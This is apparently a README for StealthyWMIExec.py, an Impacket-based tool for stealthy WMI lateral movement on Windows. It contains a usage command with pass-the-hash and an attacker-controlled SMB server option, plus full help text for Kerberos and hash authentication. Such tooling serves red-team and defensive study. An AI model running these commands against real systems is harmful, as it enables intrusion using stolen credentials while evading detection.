# StealthyWMIExec.py
A stealthier approach to WMI-based command execution using Impacket without touching the disk.
basid on my blog [Stealthy WMI lateral movement - StealthyWMIExec.py](https://ghaleb0x317374.github.io/2026/03/15/Stealthy-WMI-lateral-movement-StealthyWMIExec.py.html)


![StealthyWMIExec](StealthyWMIExec.png)

```bash
sudo python3 StealthyWMIExec.py "domain/user:password@target" 'command' -smbIP SMBserver -hashes ":NTHash"
```
Help : 
```
usage: StealthyWMIExec.py [-h] [-debug] [-codec CODEC] [-com-version MAJOR_VERSION:MINOR_VERSION] [-smbIP SMBIP] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key]
                          [-dc-ip ip address] [-target-ip ip address] [-A authfile] [-keytab KEYTAB]
                          target [command ...]

Executes a semi-interactive shell using Windows Management Instrumentation.

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>
  command               command to execute at the target. If empty it will launch a semi-interactive shell

options:
  -h, --help            show this help message and exit
  -debug                Turn DEBUG output ON
  -codec CODEC          Sets encoding used (codec) from the target's output (default "utf-8"). If errors are detected, run chcp.com at the target, map the result with
                        https://docs.python.org/3/library/codecs.html#standard-encodings and then execute wmiexec.py again with -codec and the corresponding codec
  -com-version MAJOR_VERSION:MINOR_VERSION
                        DCOM version, format is MAJOR_VERSION:MINOR_VERSION e.g. 5.7
  -smbIP SMBIP          ip to retrive commands from and send command to by using SMB

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones
                        specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)
  -dc-ip ip address     IP Address of the domain controller. If ommited it use the domain part (FQDN) specified in the target parameter
  -target-ip ip address
                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve it
  -A authfile           smbclient/mount.cifs-style authentication file. See smbclient man page's -A option.
  -keytab KEYTAB        Read keys for SPN from keytab file
```
